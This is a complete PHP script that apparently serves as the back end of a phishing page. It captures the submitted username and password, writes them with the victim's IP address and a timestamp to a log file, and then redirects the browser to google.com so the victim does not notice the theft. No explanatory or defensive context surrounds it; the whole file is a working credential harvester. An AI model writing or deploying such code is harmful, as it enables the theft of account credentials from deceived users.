<?php
// destiny credential file
$filename = "output.log";

// get data
$username = isset($_POST['username']) ? $_POST['username'] : 'Unknown';
$password = isset($_POST['password']) ? $_POST['password'] : 'No-Password';

// data new line
$log = "User: " . $username . " | Pass: " . $password . " | IP: " . $_SERVER['REMOTE_ADDR'] . " | Date: " . date("Y-m-d H:i:s") . "\n";

// write log to file
file_put_contents($filename, $log, FILE_APPEND);

// Fake redirect
echo "<script>window.location.href='https://google.com';</script>";
?> 